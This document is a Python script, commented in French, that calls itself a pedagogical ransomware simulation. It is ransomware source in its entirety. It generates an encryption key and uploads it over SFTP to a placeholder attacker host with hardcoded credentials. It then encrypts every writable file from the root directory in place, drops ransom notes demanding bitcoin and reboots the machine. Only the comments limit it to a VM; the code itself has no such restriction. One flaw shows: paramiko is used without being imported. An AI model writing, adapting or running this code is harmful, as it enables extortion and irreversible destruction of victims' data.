#!/usr/bin/env python3
# ransomware_total.py - Simulation pédagogique de ransomware
# Usage: sudo python3 ransomware_total.py (UNIQUEMENT EN VM ISOLEE)

import logging
import os
import socket
import subprocess
import sys
import time
from cryptography.fernet import Fernet

# Configuration
SFTP_SERVER = "attacker.example.com"  # À remplacer par l'IP du serveur SFTP en environnement de test
SFTP_USER = "ransomware_operator"
SFTP_PASS = "MaliciousPassword123!"
SFTP_PORT = 22
SFTP_KEY_PATH = "/tmp/encryption_key.key"
LOG_FILE = "/var/log/ransomware_sim.log"

# Initialisation du logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)


def check_root():
    """Vérifie si le script est exécuté en root"""
    if os.geteuid() != 0:
        logging.error("Le script doit être exécuté en tant que root!")
        sys.exit(1)


def generate_key():
    """Génère une clé de chiffrement Fernet"""
    try:
        key = Fernet.generate_key()
        with open(SFTP_KEY_PATH, "wb") as key_file:
            key_file.write(key)
        logging.info(f"Clé de chiffrement générée: {SFTP_KEY_PATH}")
        return key
    except Exception as e:
        logging.error(f"Erreur génération clé: {str(e)}")
        sys.exit(1)


def send_key_via_sftp(key):
    """Transmet la clé via SFTP"""
    try:
        transport = paramiko.Transport((SFTP_SERVER, SFTP_PORT))
        transport.connect(username=SFTP_USER, password=SFTP_PASS)
        sftp = paramiko.SFTPClient.from_transport(transport)

        remote_path = f"/home/{SFTP_USER}/stolen_keys/{socket.gethostname()}_key.key"
        sftp.put(SFTP_KEY_PATH, remote_path)
        sftp.close()
        transport.close()

        logging.info(f"Clé transmise avec succès à {SFTP_SERVER}:{remote_path}")
        return True
    except Exception as e:
        logging.error(f"Échec transmission SFTP: {str(e)}")
        return False


def encrypt_file(filepath, fernet):
    """Chiffre un fichier en place avec Fernet"""
    try:
        # Lecture du contenu original
        with open(filepath, "rb") as file:
            original_data = file.read()

        # Chiffrement
        encrypted_data = fernet.encrypt(original_data)

        # Écriture du contenu chiffré (remplacement)
        with open(filepath, "wb") as file:
            file.write(encrypted_data)

        logging.debug(f"Fichier chiffré: {filepath}")
        return True
    except Exception as e:
        logging.warning(f"Échec chiffrement {filepath}: {str(e)}")
        return False


def encrypt_system(fernet):
    """Parcourt et chiffre le système de fichiers"""
    exclude_dirs = {
        '/proc', '/sys', '/dev', '/run', '/tmp',
        '/var/run', '/var/lock', '/snap'
    }

    total_encrypted = 0
    start_time = time.time()

    for root, _, files in os.walk('/'):
        # Exclusion des dossiers spéciaux
        if any(root.startswith(ex_dir) for ex_dir in exclude_dirs):
            continue

        for filename in files:
            filepath = os.path.join(root, filename)

            try:
                # Vérification que c'est un fichier régulier
                if os.path.isfile(filepath) and os.access(filepath, os.W_OK):
                    if encrypt_file(filepath, fernet):
                        total_encrypted += 1
            except Exception as e:
                logging.warning(f"Erreur traitement {filepath}: {str(e)}")
                continue

    logging.info(f"Chiffrement terminé. {total_encrypted} fichiers chiffrés en {time.time() - start_time:.2f}s")


def create_ransom_note():
    """Crée un message de rançon"""
    note = """
    VOS FICHIERS ONT ÉTÉ CHIFFRÉS!

    Pour récupérer vos données, vous devez:
    1. Envoyer 0.5 BTC à l'adresse: 1Ma1wareSimu1BitcoinAddres5
    2. Envoyer un email à ransomware@example.com avec votre ID: {hostname}

    Vous avez 72 heures avant que la clé ne soit définitivement supprimée.
    """.format(hostname=socket.gethostname())

    note_paths = ['/root/README.txt', '/home/README.txt', '/README.txt']

    for path in note_paths:
        try:
            with open(path, 'w') as f:
                f.write(note)
            logging.info(f"Note de rançon créée: {path}")
        except Exception as e:
            logging.warning(f"Impossible de créer la note {path}: {str(e)}")


def reboot_system():
    """Redémarre le système"""
    logging.info("Déclenchement du redémarrage du système")
    try:
        subprocess.run(['reboot'], check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Échec redémarrage: {str(e)}")
        sys.exit(1)


def main():
    """Fonction principale"""
    check_root()
    logging.info("=== Début de l'exécution du ransomware simulé ===")

    # Étape 1: Génération de la clé
    logging.info("Génération de la clé de chiffrement...")
    key = generate_key()
    fernet = Fernet(key)

    # Étape 2: Exfiltration de la clé
    logging.info("Transmission de la clé via SFTP...")
    if not send_key_via_sftp(key):
        logging.error("Échec transmission clé - Abandon")
        sys.exit(1)

    # Étape 3: Chiffrement du système
    logging.info("Début du chiffrement du système...")
    encrypt_system(fernet)

    # Étape 4: Message de rançon
    logging.info("Création des notes de rançon...")
    create_ransom_note()

    # Étape 5: Redémarrage
    logging.info("Préparation du redémarrage...")
    reboot_system()


if __name__ == "__main__":
    main()